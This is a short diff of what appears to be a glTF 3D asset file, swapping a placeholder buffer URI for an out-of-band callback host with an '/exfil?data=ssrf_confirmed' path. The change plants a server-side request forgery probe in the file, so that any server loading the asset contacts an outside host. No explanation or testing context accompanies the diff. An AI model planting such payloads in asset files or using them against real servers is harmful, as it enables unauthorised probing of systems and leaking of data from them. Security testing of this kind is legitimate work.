@@ -5,7 +5,7 @@
   },
   "buffers": [
     {
-      "uri": "https://YOUR_SERVER.com/exfil?data=ssrf_confirmed",
+      "uri": "https://elulowseqpnqwrotewdfuf0qhdxbs9x67.oast.fun/exfil?data=ssrf_confirmed",
       "byteLength": 100
     }
   ],
